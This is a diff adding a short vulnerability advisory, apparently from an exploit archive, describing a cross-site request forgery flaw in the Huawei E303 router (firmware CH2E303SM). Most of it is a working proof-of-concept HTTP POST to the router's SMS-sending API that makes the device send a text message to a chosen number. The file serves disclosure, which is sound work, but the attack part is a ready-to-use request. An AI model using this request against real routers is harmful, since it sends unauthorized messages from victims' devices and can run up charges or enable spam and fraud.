@@ -1,0 +1,24 @@
+source: http://www.securityfocus.com/bid/67747/info
+
+Huawei E303 Router is prone to a cross-site request-forgery vulnerability.
+
+Exploiting this issue may allow a remote attacker to perform certain unauthorized actions. This may lead to further attacks.
+
+Huawei E303 Router running firmware versions CH2E303SM is vulnerable; other versions may also be affected. 
+
+[Proof -of-concept HTTP POST request]:
+POST /api/sms/send-sms HTTP/1.1
+Host: hi.link
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.0) Gecko/20100101 Firefox/25.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.8,de-de;q=0.5,de;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://hi.link/
+Connection: keep-alive
+Content-Type: text/plain
+Content-Length: 225
+
+<?xml version="1.0" 
+encoding="UTF-8"?><request><Index>-1</Index><Phones><Phone>4422</Phone></Phones><Sca></Sca><Content>
+Sample Text</Content><Length>0</Length><Reserved>1</Reserved><Date>2013-12-03 
+16:00:00</Date></request>
